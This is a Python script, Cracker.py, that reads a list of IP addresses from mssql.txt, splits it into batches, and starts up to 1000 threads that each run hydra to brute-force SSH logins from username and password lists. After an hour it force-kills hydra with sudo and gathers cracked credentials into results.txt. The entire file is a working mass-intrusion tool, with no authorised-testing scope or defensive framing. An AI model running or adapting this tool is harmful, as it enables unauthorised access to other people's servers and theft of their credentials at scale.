# coding:utf-8
"""
date:2020-1-18
program:Cracker.py
author:Hui
Operating platform: Linux
"""
import time
import threading
import os
import subprocess

class Cracker:

    def __init__(self):
        self.Threads = 1000 # 设置线程数
        self.path = os.getcwd() # 获取运行目录
        self.fileName = self.path + "/mssql.txt" #IP存放文件夹
        subprocess.call("mkdir -p ./result ./List", shell=True, cwd=self.path)
        subprocess.call("cat ./result/result*.txt | grep -v \"#\" >> results.txt", shell=True, cwd=self.path)
        subprocess.call("rm -f ./List/List*.txt&&rm -f ./result/result*.txt", shell=True, cwd=self.path)

    def ergodic(self): # 遍历IP
        Rows = 0 # 行数记录
        FileRecord = 0 # 文件数记录
        with open(self.fileName, 'r', encoding='utf-8') as f:
            for line in f:
                if Rows < 200:
                    ListFile = open(self.path+"/List/List{}.txt".format(FileRecord), "a", encoding="utf-8")
                    ListFile.write(line)
                    Rows +=1
                if Rows == 199 :
                    Rows = 0
                    FileRecord +=1
                if FileRecord == self.Threads:
                    self.threadings()
                    Rows = 0
                    FileRecord = 0

    def Cracker_(self,i): # 调用hydra爆破
        subprocess.call("hydra -L ./Config/user.txt -P ./Config/pass.txt -M ./List/List{}.txt -o ./result/result.txt -T 5000 -K -q -vV -w 5 -f -I ssh".format(i), shell=True,cwd=self.path)

    def threadings(self):
        list = []
        for i in range(self.Threads):
            list.append(threading.Thread(target=self.Cracker_, args=(i,)))
            list[i].start()
        time.sleep(3600) #等待1小时后Kill所有hydra
        subprocess.call("sudo kill -9 $(pidof hydra)", shell=True, cwd=self.path)
        subprocess.call("rm -f ./List/List*.txt&&rm -f hydra.restore", shell=True, cwd=self.path)


    def run(self):
        self.ergodic()
        subprocess.call("cat ./result/result*.txt | grep -v \"#\" >> results.txt", shell=True, cwd=self.path)
        subprocess.call("rm -f ./List/List*.txt&&rm -f ./result/result*.txt", shell=True, cwd=self.path)

if __name__ == '__main__':
    C = Cracker()
    C.run()
